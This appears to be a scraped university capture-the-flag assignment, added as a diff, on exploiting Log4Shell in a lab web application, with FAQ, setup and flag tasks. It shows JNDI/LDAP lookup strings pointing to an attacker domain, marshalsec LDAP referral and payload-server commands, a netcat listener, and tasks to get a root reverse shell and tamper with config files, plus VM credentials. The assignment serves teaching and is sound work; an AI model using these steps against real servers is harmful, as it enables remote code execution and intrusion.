@@ -1,0 +1,722 @@
+Log4Shell
+Due Mar 9 by 11:59pm Points 100 Submitting an external tool Available Feb 23 at 12am - Mar 9 at 11:59pm
+Welcome!
+
+For this assignment you will exploit a real world vulnerability: Log4Shell.
+
+This will be a capture-the-flag style project where you will exploit a web application with a vulnerable version of log4j. 
+
+A correct solution will output a 'flag' or 'key'. There are 7 tasks to complete for 7 total flags. 6 required and 1 extra credit for a possible total of 102%. You will submit these flags in json format to Gradescope for grading in a file named project_log4shell.json.
+
+There is a template in the /home/log4j/Desktop/log4shell folder of the VM: project_log4shell.json. Copy this file and fill out the appropriate values for the flags found. Submit this file to Gradescope for immediate feedback with the autograder. Your grade will be reflected here in Canvas after the assignment has closed.
+
+You'll use the same virtual machine you've been using. Links to an external site.
+
+If you need to redownload the VMLinks to an external site., do it early in case you run into slow downloads.
+
+The VM username and password is log4j and ElCapitan_2024
+
+Go here for project details on the course Github Pages site:
+
+https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/
+
+Good luck and have fun!
+
+Necessary Disclaimer:
+THIS IS A REAL WORLD CRITICAL VULNERABILITY THAT MOST VENDORS HAVE PATCHED BUT THERE STILL COULD BE APPLICATIONS WITHOUT THE PATCH. THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY. ATTEMPTING THIS ON REAL APPLICATIONS COULD PUT YOU IN VIOLATION OF THE LAW AND GEORGIA TECH IS NOT RESPONSIBLE.
+
+
+
+
+
+Log4Shell
+Due Mar 9 by 11:59pm Points 100 Submitting an external tool Available Feb 23 at 12am - Mar 9 at 11:59pm
+Welcome!
+
+For this assignment you will exploit a real world vulnerability: Log4Shell.
+
+This will be a capture-the-flag style project where you will exploit a web application with a vulnerable version of log4j. 
+
+A correct solution will output a 'flag' or 'key'. There are 7 tasks to complete for 7 total flags. 6 required and 1 extra credit for a possible total of 102%. You will submit these flags in json format to Gradescope for grading in a file named project_log4shell.json.
+
+There is a template in the /home/log4j/Desktop/log4shell folder of the VM: project_log4shell.json. Copy this file and fill out the appropriate values for the flags found. Submit this file to Gradescope for immediate feedback with the autograder. Your grade will be reflected here in Canvas after the assignment has closed.
+
+You'll use the same virtual machine you've been using. Links to an external site.
+
+If you need to redownload the VMLinks to an external site., do it early in case you run into slow downloads.
+
+The VM username and password is log4j and ElCapitan_2024
+
+Go here for project details on the course Github Pages site:
+
+https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/
+
+Good luck and have fun!
+
+Necessary Disclaimer:
+THIS IS A REAL WORLD CRITICAL VULNERABILITY THAT MOST VENDORS HAVE PATCHED BUT THERE STILL COULD BE APPLICATIONS WITHOUT THE PATCH. THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY. ATTEMPTING THIS ON REAL APPLICATIONS COULD PUT YOU IN VIOLATION OF THE LAW AND GEORGIA TECH IS NOT RESPONSIBLE.
+
+
+
+
+
+Log4Shell
+Important Disclaimer:
+This is a current real world critical vulnerability. Attempting this on real applications could put you in violation of the law and Georgia Tech is not responsible.
+Learning Goals of this Project:
+Exploring a real world critical Java exploit in the Log4J logger: Log4Shell
+[NIST CVE Overview] [Randori: What is Log4Shell]
+
+Important Reference Materials:
+General Project Introduction This is a general overview. Some details may change each semester (i.e., login credentials)
+LDAP server used to run the exploit.
+Log4JExploit Intro
+How Log4Shell Works
+Log4J Documentation
+Log4Shell Example
+Log4Shell Example 2
+Helpful Linux Networking Commands
+NCAT Command
+Java Unmarshaller Security
+A Journey From JNDI/LDAP Manipulation To RCE
+Hands on Introduction to Log4Shell exploit in general (not this project but helpful)
+If you have no experience in Java, Log4j/logging, RESTful applications, JNDI, LDAP, we STRONGLY encourage you to do research into the topics.
+A Real World Recent Example of This Exploit and Its Dangers
+Background
+Log4J is a very popular open-source framework that allows application developers to log important messages such as program flow, program state, exceptions, etc. These messages can include user input, dynamic data, database results, etc.
+
+Java Naming and Directory Interface (JNDI) creates a way for Java Objects to be looked up at runtime. There are many directory interfaces that provide different ways to lookup files. A common example is a database connection pool so that applications deployed on a server can get the connections they need by only needing to know the JNDI name instead of having to have the connection details. You can use Java Serialization to store the byte array representation of an object to store objects in a directory/naming service. JNDI uses Naming References if the object is too large such as “ldap://server/location”
+
+Where this comes into play in this exploit, is the Lightweight Directory Access Protocol (LDAP) which is not specific to Java. LDAP provides the communication language that is required to receive and send information from directory services. It can be used for authentication like sending usernames/passwords or retrieving object data through a url from another server.
+
+To tie this into Log4J, Log4J performs lookups which allow for string substitution of certain strings. These are in the form of ${prefix:name} i.e. a common one would be ${java:runtime} and running this would produce “Running Java version 1.8.0_20”. Here is where the JNDI and LDAP come into play. ${jndi:<lookup>} is a valid lookup expression recognized by the lookup by Log4J.
+
+A malicious user could specify a valid lookup protocol such as LDAP, RMI, or DNS in the JNDI lookup and direct the Log4J lookup to their malicious server/file. An example could be ${jndi:ldap://cs6035.com/exploitfile} which would load data from that domain if a connection can be established. Attackers can even get environment variables if RCE is disabled and learn about the server/server environment. Often, HTTP requests log header information, query parameters, path parameters, and more which allow a vector for this attack to take place. With this background, now we are ready to start this lab.
+
+Here is a visual of the Log4j exploit and how it is accomplished (you can zoom in if this is too small via ctrl + scroll):
+
+alt text
+
+Table of contents
+FAQ
+Setup
+Intro Flag
+Flag 1: Environment Echo
+Flag 2: Get a Shell
+Flag 3: Config.Properties Surprise
+Flag 4: Command and Concat
+Flag 5: PubSub Override
+Flag 6: Restful
+Flag 7: SQL
+Submission
+
+
+Frequently Asked Question(s) (FAQ)
+Start With:
+General Project Introduction This is a general overview. Some details may change each semester (i.e., login credentials)
+Important Reference Materials
+Note: To ensure that the autograder accurately grades your submission, you should create/update your .json file in a text editor on the VM and submit from the VM. Do not use a word document program like LibreOffice or Word. The submission must be proper json format for the autograder to give credit.
+
+VM Questions
+Q) Do I need to use the provided VM for this project
+
+A) Yes. You won’t be able to complete the project without using it, as the environment is set up specifically to handle this project.
+Q) I am re-taking this course. Can I use the VM that I downloaded from an earlier semester?
+
+A) NO! Using a VM from earlier semesters is not permitted and may result in a 100% penalty. Please download the VM from the link present in the writeup for the current semester.
+Q) I have an M1-based Mac, can I run the VM?
+
+A) Unfortunately, we do not have a version of this project for M1-based Mac’s
+Q) The VM Password is:
+
+A) Credentials for the vm are on the assignment page for Log4Shell in Canvas
+Q) Should I update the VM?
+
+A) No DON’T update the virtual machine! You can allocate more resources via the Virtual Box (or other platform) configurations depending on your local host but you shouldn’t need to.
+Q) My Virtual Machine is slow or not turning on, what should I do?
+
+A) Feel free to increase the amount of RAM in the Virtual Machine by a little. You may also have to disable 3D acceleration within the Virtual Machine
+Q) General Ambiguous errors with importing: “Error When Importing Project E_INVALIDARG (0x80070057)”
+
+A) This is normally due to insufficient space on the hard drive or File System mismatch (file system on Windows needs to be NTFS with VirtualBox).
+Make sure you also have permission to be allocating storage. If you are on a work laptop that has secured partitions, you may not be able to import the VM.
+You can also try following these steps: VirtualBox : Failed to import appliance
+Q) VirtualBox is giving me weird “Kernel Driver not installed” errors (Intel Mac).
+
+A) This is likely due to permissions settings. See Driver not installed
+Q) I have restarted the VM correctly and am still getting a blank flag. What else can I try?
+
+A) When rebooting, we have found you can’t “switch user” and then log into the proper username. You need to “log out” of the wrong account, then log in as the project user.
+Common troubleshooting steps for VirtualBox:.
+
+Enabling/disabling 3d acceleration, giving more video memory
+Increasing cpus and/or ram (or if you don’t have enough, maybe lowering those)
+Enabling/disabling PAX/VT-X in the vm system settings
+Submission and Gradescope
+Q) What is the format and name of the file I need to submit?
+
+A) The submission file (only file to be submitted to Gradescope) is json format. There is a template that can be copied in the Submission Page page. You only need to fill in the values for each flag.
+Q) Do I need to submit to both Gradescope and Canvas?
+
+A) For this project, you only need to submit to Gradescope.
+Q) How many times can I submit to Gradescope?
+
+A) You can submit as many times as you want until the project closes in Gradescope.
+Q) Once I submit to Gradescope, when will I get my grade?
+
+A) Grades will be released after the due date + any extensions have expired. Gradescope submissions will, however, give immediate feedback on passing our autograder tests. There are no hidden tests so you can be confident in your score (barring any issues with academic honesty).
+Q) Do I get partial credit for passing some tasks?
+
+A) Yes, See rubric in writeup for grading scale
+Q) I am getting a flag in the VM but Gradescope still shows the answer as incorrect.
+
+A) Make sure you are using your GTID (9 digit numeric student ID number) for each flag.
+Q) Do I need to do all flags in sequence?
+
+A) No, but encouraged. You can do these in any order you wish. However, each flag builds on the previous one so concepts you learn in a previous flag will be used in a later one. IF YOU GET STUCK ON SOMETHING TRY ANOTHER FLAG AND COME BACK TO IT!
+Q) Do I need to run all the setup steps again if I restart the VM?
+
+A) Yes, you need to rerun all setup steps and start the container when restarting the VM.
+Q) Can we submit late?
+
+A) No. Please refer to the syllabus.
+Q) When is the project due?
+
+A) Please refer to the Schedule.
+Flag Task Hints and Questions
+Q) I don’t know where to start! I’m having trouble understanding what to do.
+
+A) Start at the beginning of the instructions, watch the linked tutorial video, read the resources linked. While there is no particular order required for completing these tasks, the first task is helpful as an introduction to the tools and process. Follow the steps and experiment a lot. Find online resources of other examples of this exploit and follow them step for step.
+Q) What does the web server on port 8080 represent?
+
+A) It’s a REST API that retrieves information for a frontend client. It’s owned by the victim and runs on Apache Tomcat in a Docker container.
+Q) What are the different servers involved in this project?
+
+A) There are three main servers:
+Vulnerable application server (REST API on port 8080)
+LDAP server
+Local Python server
+Q) I’m stuck on the intro flag. Any hints?
+
+A) For the intro flag:
+Look at the screenshots provided in the intro flag instructions
+Use the Apache Log4j Lookups page to understand the syntax for accessing environment variables
+Focus on echoing the Java version as mentioned in the instructions
+Q) How do I transition from solving the intro flag to solving Flag 1?
+
+A) Once you’ve solved the intro flag:
+Use the same basic approach but focus on the ADMIN_PASSWORD environment variable
+Modify your payload to target this specific variable
+Remember that Flag 1 is called “Environment Echo” - this is a hint about which lookup to use
+Q) I do not see the log4shell folder in my VM Desktop?
+
+A) Make sure you are logged in to the user log4j. If you are on the incorrect user, logout by clicking the blue Lubuntu logo in the bottom left -> Leave -> Logout.
+Q) How do I know if I got the flag?
+
+A) You will see an output message with your flag displayed when the exploit is successful. Copy this flag into the appropriate key-value pair in the json file.
+alt text
+
+Q) Why does the message say that I got the flag but the flag is blank?
+
+A) Run the scripts to stop the container and start it again. Refer to the Setup steps in the instructions for this.
+Q) I am not seeing my System.out.println messages. Why are they not printing?
+
+A) You need to tail the console.log file not the cs6035.log file.
+Q) Do I need to import anything into the Java class?
+
+A) Yes, you will likely need to import some packages from the Java standard library. Only Java standard library imports are needed for this project. If you find yourself wanting to use a 3rd party .jar, you are over complicating your solution and we will not help you compile your code.
+Q) I am having trouble with the java class. Do I use a main method? How do I call it?
+
+A) No, you will not be using a main method. Only write your code in the areas specified with the “// TODO: your exploit code should go here” comment. Look into what a “static block” is, and why it is important/needed for this exploit to work.
+Q) Do I need to implement an interface such as serializable?
+
+A) No. Don’t overthink it. The code for each of the flag exploits will be different but none should need more than a few lines of code. You are not expected to be creating classes or interfaces or any new files.
+Q) I echoed the ADMIN_PASSWORD and got a huge output, is this correct?
+
+A) No, it should match the screenshots output. You need to echo the ADMIN_PASSWORD env variable stored on the application server NOT the vm. This should be done through curl command.
+Q) I uncommented and am using the provided logger in the Exploit class. But when I run the exploit I get an endless loop of logging?
+
+A) This is expected. There are several recalls happening when you use the logger that create this infinite loop. To stop this, just kill the process for the LDAP server (python command). It may still be useful to print test statements as you code your exploit but be aware that this is normal. Comment out the log statements to exploit without the loop. The logger is just for debugging. You should comment log statements out when you run to get your flag.
+Q) I am not able to find where ADMIN_PASSWORD is stored. Do you have any suggestions?
+
+A) The ADMIN_PASSWORD is an environment variable. You should look up how to echo environment variables. This will be very similar to the java version lookup you performed in the intro.
+Q) I am really struggling with Flag 2. Can you provide any help?
+
+A) Although Flag 2 is not the hardest flag, it is the hardest to get started on and get over the learning curve. Once you complete Flag 2, a lot of the hard parts to understand of the following 4 flags will be covered. We strongly suggest putting the project down, and go to the linked resources and follow those guides and really take the time to understand the exploit, how it is possible, how it is accomplished, and how all the parts used work together to achieve the task. Once you understand all this, you should be equipped to do Flag 2 and the later flags.
+Q) What should I modify in the Exploit.java file for Flag 2?
+
+A) You need to add code to the Exploit.java file that will allow you to gain a reverse shell on the target server. The exact code is part of the challenge.
+Q) Which ports should I use for the different components in Flag 2?
+
+A) You can use the default ports specified in the setup instructions. For the netcat listener, port 9999 is commonly used.
+Q) Why am I not seeing any output in my netcat listener for Flag 2?
+
+A) If you’re not seeing a “Connection received” message, it’s likely that either your curl command is incorrect or your Java code in Exploit.java is not properly creating a reverse shell.
+Q) What if I can see my exploit executing but can’t run commands like ‘whoami’?
+
+A) This likely means your reverse shell command in the Java code is not correctly implemented. Review your code!
+Q) What should I see in the different terminal windows when the exploit is successful?
+
+A) You should see:
+LDAP server showing a redirect to your Exploit.class
+Python server showing a 200 status code for GET /Exploit.class
+“Entering Exploit” message in console.log (which is the result of System.out.println in your Exploit.class)
+“Connection received” message in the netcat listener (only for Flag 2)
+Q) Do I need an in-depth understanding of Java to complete this project?
+
+A) No, you should be able to complete this project with no Java background and have plenty of time to learn/research the requirements of java. You will need a basic/moderate understanding of networking though.
+Q) I think my code is right but I am not getting any output. How do I tell if my code executes or not?
+
+A) You can use the logging framework in the class file to output useful commands like “Starting the exploit”, “Exploit code ran”, or anything else to help you track control execution. BEWARE USING THE LOGGER COULD RESULT IN ENDLESS LOOPING FROM THE SERVER LOOKUPS. Use CTRL + C in the LDAP terminal to stop it.
+Q) My LDAP is being called but returning “Foo”. Why is that?
+
+A) This usually means the server is not getting a response from the python server or you sent a bad request to it from the curl. Ensure your python server is receiving the request. If not, the issue lies there. If it is returning 404, make sure the requested file from the LDAP’s name matches your .class file. For simplicity, please use Exploit.class or Exploit2.class etc if multiple are needed.
+Q) Is it normal for my Python HTTP server to receive multiple requests for one curl request?
+
+A) Yes, it’s not unusual due to nested logging. The number of requests doesn’t interfere with getting the flags.
+Q) Why are my flag hashes the same when I use my GATECH ID or the generic “123456789”?
+
+A) The flag will be the same for Flag 1. For the rest of the flags, it should be different.
+Q) What should I do if ‘tail -f console.log’ stops updating?
+
+A) This might be due to the VM or curl causing an endless loop. Try restarting the VM or the container.
+Q) Do I need to change the URL for each flag?
+
+A) Each flag has its specific URL(s) provided in the writeup. You only need to modify the attack vector for each flag.
+Q) I’m getting a 400 Bad Request error. What does this mean?
+
+A) This usually indicates that your curl command syntax is incorrect. Double-check your command, especially the formatting of the JNDI lookup string.
+Q) Should I be calling the LDAP server directly from my curl command?
+
+A) No, your curl command should be sent to the vulnerable application (localhost:8080). The application should then make the LDAP call as part of the exploit.
+Q) Can I run 2 LDAP servers?
+
+A) Yes, there could be some flags where this is required.
+Q) How do I run another LDAP? I get an error about port 1389 in use.
+
+A) You can specify a port using an optional parameter after the LDAP command. Refer to the write up on how to do this.
+Q) Do I need to run a python server for each Exploit.class file?
+
+A) No, the server can “serve” any file you have stored in the directory you are running it in. You just need to update the curl and the LDAP command to request the specific file you wish to send to the vulnerable application.
+Q) I am getting “/rest/error and Controller name: org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController. How do I fix this error?
+
+A) You don’t, this is expected and is a built in feature of Springboot. Scroll further up in the logs to see the actual REST api call you made.
+Q) How can I debug my exploit if it’s not working?
+
+A) Add print statements to your Java code, check all terminal outputs (LDAP, Python server, netcat (for flag 2)), and review the console.log file. Ensure your curl command is correct and you’re using the right ports.
+Q) Any idea how to fix this:
+
+Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [Java version 1.8.0_20]: Invalid mime type "Java version 1.8.0_20": does not contain '/']
+
+A) You don’t/can’t. This is expected as you are not sending a valid mime type when you do the environment echo.
+Q) What is a mime type?
+
+A) You do not need to know this to complete this project. However, here is some info if you’re curious
+Back to top
+
+Disclaimer: You are responsible for the information on this website. The content is subject to change at any time. © 2024 Georgia Institute of Technology. All rights reserved.
+
+
+
+
+Setup
+To get setup for the flags, follow the steps carefully below, and be sure you are running each in a separate terminal window as noted.
+
+You will need switch users to login to log4j user via:
+
+  Credentials can be found in Canvas on the Log4Shell Assignment page
+
+In the home directory of log4j user, start the container with the start script:
+
+  ./StartContainer.sh
+
+Open a new terminal window and go to “Desktop/log4shell/logs”:
+
+  cd Desktop/log4shell/logs
+
+Run the following command to view the logs:
+
+  tail -f cs6035.log
+
+OR to view System.out.println messages:
+
+  tail -f console.log
+
+You should now see the tail of the log file from the application running.
+
+alt text
+
+**If the logs stop populating, then just stop and restart the tail. This is happening because the data logged gets too large so the log “rolls over” to another file.**
+
+1. Run the LDAP Server:
+Open a new terminal window and run the following command to set the current directory to “Desktop/log4shell/target”:
+
+  cd ~/Desktop/log4shell/target
+
+Next, start the LDAP server by running:
+
+  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/#Exploit"
+
+The IP you will be using is below. This is NOT the localhost IP address but the docker host.
+
+  172.17.0.1
+
+It is very important that this matches the port specified in the Malicious server. If your exploit is not working because it is not connecting to the malicious server, your ports likely do not match OR the vm’s IP is not correct.
+
+You should see the following output:
+
+A terminal window displaying a command execution to start an LDAP server and the output indicates the server is listening on `0.0.0.0:1389`
+
+2. Run the Malicious Server:
+Open a new terminal and make sure the active directory is the directory that contains your malicious .class file. For simplicity, we have created “Desktop/log4shell/{flag_no}” for you to work in. Do not leave this directory. Run the server in “Desktop/log4shell/{flag_no}” by the following command:
+
+  python3 -m http.server 4242 
+
+It is very important that this matches the port specified in the LDAP server. If your exploit is not working because it is not connecting to the malicious server, your ports likely do not match OR the vm’s IP is not correct You should see the following output:
+
+Terminal showing a Python command starting an HTTP server on port 4242, with output confirming the server is running
+
+3. Read data that is flowing on the network (This step is required for Flag 2 but is optional for the rest):
+Open a terminal and run:
+
+  nc -nlvp <your_desired_port> 
+
+You should see the following output:
+
+Terminal showing the command nc -nlvp 9999 with output indicating it is listening on port 9999
+
+To print debug statements from your Java code, tail the ~/Desktop/log4shell/logs/console.log file and add System.out.println statements to your Exploit.java.
+
+
+
+
+Intro Flag
+Now that we are set up, let’s do a quick rundown of Log4j, how it works at a high level, and test that we are able to successfully call and exploit the application.
+
+As you should know from the background and resource’s section, Log4j is an application logging library that outputs user defined program information. An example log statement would look like the following:
+
+static Logger log = LogManager.getLogger(RestServlet.class.getName());
+log.debug("ApplicationId: {}", applicationId);
+
+The log statement above as you can see, defines the class, log level of the message and the actual message. Notice that we are injecting user input into the log message. This is where our vulnerability is.
+
+To be more specific, here is what the output of the message actually will look like: Log entry showing a DEBUG message from RestServlet.java with ApplicationId: cs6035-mini-project and a timestamp
+
+Now we can map the code above to the logged message. The date/time is defined in configuration files which are out of the scope of this project. Next is where our code starts to map. We have [Classname.java:LineNumber]. This is helpful to know exactly what part of your code is executing and where.
+
+Next, we see DEBUG. This is what is called the log level. Log levels are used for the amount of output you want your application to log, or even to classify errors different from informative messages. The typical log levels are DEBUG, INFO, WARN, ERROR, FATAL. To further explain, if a log level is set to say ERROR, your application will not log anything on WARN, INFO, or DEBUG level. This application is set to DEBUG.
+
+Finally, we get to the actual logged message. As you can see, we log the constant text as well as the injected variable applicationId, which is our applicationId. This is the most important part you will want to pay attention to. Throughout this project, you will try to find messages that log user defined input and inject your malicious string into it.
+
+Now, let’s have some fun and get familiar with the application. To do so, we will call the application normally and then lookup the java version on the application server.
+
+To start we can run a simple inquiry to the services /isAlive endpoint and see what we get back from the logs and see if we can find anything that is exploitable.
+
+GATECH_ID IS A REQUIRED HEADER
+
+Open a new terminal and run:
+
+curl 'http://localhost:8080/rest/cartoons/isAlive' -H 'GATECH_ID:123456789' -H 'Accept:application/json'
+
+You should see your logs log some messages in the log tailing terminal window. Let’s inspect it.
+
+Go back to the terminal window you are tailing the logs in. When the server intercepts a request, it logs “Request intercepted” to alert the user where the request starts. As we can see, there is not much going on in terms of useful information, but we can see the service did log a message that could be exploitable.
+
+Voila! In the highlighted message, we see that it is logging the Method Type: GET, the URL: /rest/cartoons/isAlive, and some headers that are being logged. This is a good indicator that we can exploit this service by sending lookups through a header. alt text
+
+**Note: You can zoom in by using ctrl + scroll
+
+Take some time to inspect the logged messages and try to understand what the program is doing and the flow of it.
+
+Lets try to get the java version on the server now.
+
+The checked headers for this application are content-type, location, and X-NetworkUserId, although not all are always checked/exploitable.
+
+Construct a malicious payload using one of the logged headers that will return the java version of the host of the web application. You should see something like the screenshot below if successful: alt text
+
+**Note: You might need to scroll up to see this output.
+
+Do you see the same output? LIGHTWEIGHT BABY! Muahaha! If not, try to research the log4shell exploit more and learn how to exploit the lookup.
+
+Our hunch was correct and we have successfully exploited the vulnerability. You can play around with this if you like and see what other lookups you can perform. It is possible to lookup system settings, environment variables and much more just with this.
+
+Be sure to save your work outside of the VM in case the VM crashes or some other unforeseen issue arises. This will ensure you are not losing your work.
+
+Back to top
+
+Disclaimer: You are responsible for the information on this website. The content is subject to change at any time. © 2024 Georgia Institute of Technology. All rights reserved.
+
+
+
+
+
+Flag 1: Environment Echo (5 pts)
+Make sure you have gone through the Setup and Intro sections.
+
+If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:
+
+./StartContainer.sh
+
+The endpoint for this exploit can be called and inspected via:
+
+curl 'http://localhost:8080/rest/cartoons/isAlive' -H 'GATECH_ID:123456789' -H 'Accept:application/json'
+
+Now that you have seen how to check environment variables, run a lookup for ADMIN_PASSWORD which stores your flag for this exercise. If successful, you should see the below output: Log file showing INFO messages with details of a GET request, including URI, servlet path, and a congratulatory message in the location redirect field revealing a flag
+
+Add this flag (Congratulations! Your flag1 is: ____) to your project_log4shell.json file.
+
+NOTE: You do not need to use Java code, ldap, python server, etc to get this flag.
+
+Hint: Accept is not the only valid HTTP Header. Location, location, location
+
+
+
+Flag 2: Get a Shell (5 pts)
+Make sure you have gone through the Setup and Intro sections.
+
+If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:
+
+./StartContainer.sh
+
+The endpoint for this exploit can be called and inspected via:
+
+curl 'http://localhost:8080/rest/cartoons/isAlive' -H 'GATECH_ID:123456789' -H 'Accept:application/json'
+
+Now that we have proven this service is vulnerable and that we can exploit it in at least one place, let’s try to do more damage and do something more malicious. If you have not already, you NEED to read through the suggested readings and learn how/why it is possible to send jndi lookups.
+
+Open the “Exploit.java” file and construct a malicious payload to execute such that when the jndi/ldap lookup happens, it gives you root access on the vulnerable application server.
+
+You should have a total of 4 terminal windows open which are the 3 from the SETUP section and one terminal window to run your curl command.
+
+Once you are ready to run the exploit, ensure that the java version you are running the command is “java version 1.8.0_20” by running:
+
+java -version
+
+alt text
+
+To compile your .java file into a class file, move to the directory the .java file is stored in and run:
+
+javac Exploit.java
+
+NOTE: THIS PROJECT IS WRITTEN USING THE VULNERABLE VERSION OF 1.8.0_20. NOT ALL VERSIONS OF JAVA ALLOW LOOKUPS AND YOU COULD SPIN YOUR WHEELS FOR AWHILE NOT KNOWING WHY YOUR EXPLOIT IS NOT RUNNING IF YOU DO NOT FOLLOW THIS DIRECTION.
+
+We have added the ability to log from your Exploit.java file so that you can log useful debugging information while you are developing your exploit. To log messages from your Java class, tail the ~/Desktop/log4shell/logs/console.log file and add System.out.println statements to your Exploit.java.
+
+Make sure you are running this command from Desktop/log4shell/Flagx alt text
+
+This should create Exploit.class. Run your “python3 -m http.server 4242” command in this directory.
+
+Hint: Pay close attention to the ports you are using in this exercise.
+
+If successful, you should see similar console output as the screenshot below: alt text
+
+With success, you should see this in the console output of the nc command. Now type “whoami” and you should see “root”.
+
+alt text
+
+Did you get the screenshot above? Congratulations!
+
+If not, keep trying and ensure all of your hosts/ports match. Analyze the screenshots and make sure yours matches. If you are not getting the ldap/python server output, you likely did not set up your hosts/ports correctly OR your Exploit.java file isn’t correct.
+
+You now have root access to the vulnerable application’s server. YIKES! This is a great example why this exploit is so dangerous. You can perform any task on this server now. For now, go back 2 directories using “cd ..” and then run “java -jar Flag2.jar” to get your flag and add it to the json under “Flag2”. alt text
+
+
+
+FLAG 3: Config.Properties Surprise (25 pts)
+Make sure you have gone through the Setup and Intro sections.
+
+If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:
+
+./StartContainer.sh
+
+For this flag we will use the /cartoons/ resource. There are 4 total endpoints for this resource. Only the following 2 are relevant for this flag.
+
+Call the following endpoint to fetch all the records. Save one of the ids.
+
+GET All - Fetch all cartoon records:
+
+curl 'http://localhost:8080/rest/cartoons/cartoonList' -H 'GATECH_ID:123456789'  
+
+Call the following endpoint to GET by ID and inspect the logged output.
+
+GET By ID - Fetch a single cartoon record by ID:
+
+curl 'http://localhost:8080/rest/cartoons/cartoon/<id>' -H 'GATECH_ID:123456789' 
+
+You have caught wind that there is a properties file that this application uses to inject configurable data during runtime.
+
+For this exploit, you will use the log4j exploit to update the “config.properties” file saved in the root directory of the application. This properties file contains a property that will set the rating for all of the children’s cartoons.
+
+See if you can find anything that gives you a hint about how to exploit it/what you need to do, to update the property. Look for an out of place attack vector/variable.
+
+This application links the properties’ rating to all children’s cartoons in its response. You have a beef with childrens cartoons and don’t think kids should watch cartoons. You want to set all of the ratings to R. Mean, catoons are great! However, first, you need to make sure that this is even possible.
+
+One thing to keep in mind is that the application checks to see if this file has been tampered with. You will need to make sure you don’t overwrite the file and instead just update it. This means, all properties need to be as they were except the one you updated.
+
+For this flag, you will need to update the properties file so that when the application builds the cartoon response, it sets the rating to your gatechId. *i.e. 123456789
+
+If successful, you should get your flag in the network field of the response:
+
+alt text
+
+Note: The error message is simply informational and does not mean necessarily that your exploit was successfully executed or not.
+
+Hint: Someone might have tried to roll their own patch and tried to deny requests containing malicious string patterns.
+Hint: R rated cartoons are not exploitable.
+
+*** IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****
+
+Back to top
+
+Disclaimer: You are responsible for the information on this website. The content is subject to change at any time. © 2024 Georgia Institute of Technology. All rights reserved.
+
+
+
+
+FLAG 4: Command and Concat (25 pts)
+Make sure you have gone through the Setup and Intro sections.
+
+If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:
+
+./StartContainer.sh
+
+For this flag, we will exploit an endpoint that adds a new user:
+
+curl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:123456789' -H 'Content-Type:application/json' --data-raw '{"id":8,"userId":"2134","userName":"RSANCHEZ1","userRole":"R&D","adminYN":"Y"}'
+
+Take some time to inspect this output and see what you need to exploit. Yes the exception is expected, and maybe there is even a clue above it ;)
+
+For this flag, you will construct a malicious file (Exploit.java) and compile it, so that when deserialized it will create a simple “.txt” file on the server to get the flag. Using the log4shell exploit, create a file named “Ronnie.txt” on the server and add ONE line that says “AintNothinButAPeanut!” (You do not need the quote). If you do not follow this exactly, you will not get this flag.
+
+Upon success, you will see the output below. (You might have to scroll for this)
+
+Log file showing INFO messages with method name updateUser, a flag value, and details about publishing for user ID 2134
+
+Hint: The name of this flag is a huge hint as to what you need to do. Pay close attention to the logged messages and their format.
+
+*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****
+
+Back to top
+
+Disclaimer: You are responsible for the information on this website. The content is subject to change at any time. © 2024 Georgia Institute of Technology. All rights reserved.
+
+
+
+FLAG 5: PubSub Override (25 pts)
+Make sure you have gone through the Setup and Intro sections.
+
+If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:
+
+./StartContainer.sh
+
+For this flag, we will exploit a previous endpoint that publishes updates to a topic on the server:
+
+curl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:123456789' -H 'Content-Type:application/json' --data-raw '{"id":8,"userId":"2134","userName":"RSANCHEZ1","userRole":"R&D","adminYN":"Y"}'
+
+You remember that properties file? Good! We are going to play with it yet again.
+
+For this exploit, you will use the log4j exploit to overwrite the “config.properties” file saved in the root directory of the application. This properties file contains a topic that the application will publish a message to when updateUser call is made (the application is also subscribed to this topic as you can see in the logs).
+
+You will need to trick the application into publishing a message to a different topic with your GATECH_ID as the account number in order to generate a valid flag.
+
+Upon success, you should see your output similar to that below:
+
+Log file showing the following sequence: preparing to publish for user ID, reading topic from a properties file, publishing to a topic, entering an exploit, and revealing the flag with a congratulatory message
+
+Hint: Look through the cs6035.log to find clues about what this other topic could be. Your flag could be invalid if you have not sent your GATECH_ID appropriately in the published message.
+
+*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****
+
+Back to top
+
+Disclaimer: You are responsible for the information on this website. The content is subject to change at any time. © 2024 Georgia Institute of Technology. All rights reserved.
+
+
+
+FLAG 6: Restful Data (15 pts)
+Make sure you have gone through the Setup and Intro sections.
+
+If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:
+
+./StartContainer.sh
+
+For this flag we will use the /products/ resource. There are four endpoints for this resource:
+
+GET All - Fetch all product records
+
+curl 'http://localhost:8080/rest/products/productlist' -H 'GATECH_ID:123456789' 
+
+GET By ID - Fetch a single product record by ID
+
+curl 'http://localhost:8080/rest/products/product/<id>' -H 'GATECH_ID:123456789' 
+
+GET By Email - Fetch all records associated with an email (This will require you to create a new product with an email field. The initial set of products do not have an email persisted, they return with the default email)
+
+curl 'http://localhost:8080/rest/products/product?email=example@example.com' -H 'GATECH_ID:123456789' 
+
+POST Create or Update a new record - Post a new record or update an existing record by providing the id in the request
+
+curl -X POST 'http://localhost:8080/rest/products/product' \
+-H 'GATECH_ID:123456789' \
+-H 'Content-Type: application/json' \
+-d '{
+"make": "Ford",
+"model": "Mustang",
+"trim": "GT",
+"price": 45000.00,
+"email": "example@example.com"
+}'
+
